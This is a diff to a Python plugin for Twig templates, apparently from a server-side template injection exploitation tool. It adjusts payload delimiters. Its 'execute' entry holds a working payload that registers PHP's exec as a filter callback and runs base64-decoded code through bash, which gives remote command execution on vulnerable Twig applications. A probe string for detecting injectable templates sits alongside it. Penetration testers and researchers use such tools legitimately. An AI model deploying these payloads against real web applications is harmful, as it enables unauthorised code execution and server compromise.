@@ -11,12 +11,12 @@ class Twig(php.Php):
         # allowed. For this reason, most of the stuff is done by exec() instead of eval()-like code.
         self.update_actions({
             'render': {
-                'render': '{{{{{code}}}}}',
+                'render': '{code}',
                 'header': '{{{{{header}}}}}',
                 'trailer': '{{{{{trailer}}}}}',
                 # {{7*'7'}} and a{#b#}c work in freemarker as well
                 # {%% set a=%i*%i %%}{{a}} works in Nunjucks as well
-                'test_render': f'"{rand.randstrings[0]}\n"|nl2br',
+                'test_render': f'{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
                 'test_render_expected': f'{rand.randstrings[0]}<br />'
             },
             'write': {
@@ -33,7 +33,7 @@ class Twig(php.Php):
             },
             'execute': {
                 'call': 'render',
-                'execute': """_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}'")""",
+                'execute': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}'")}}}}""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2] 
             },
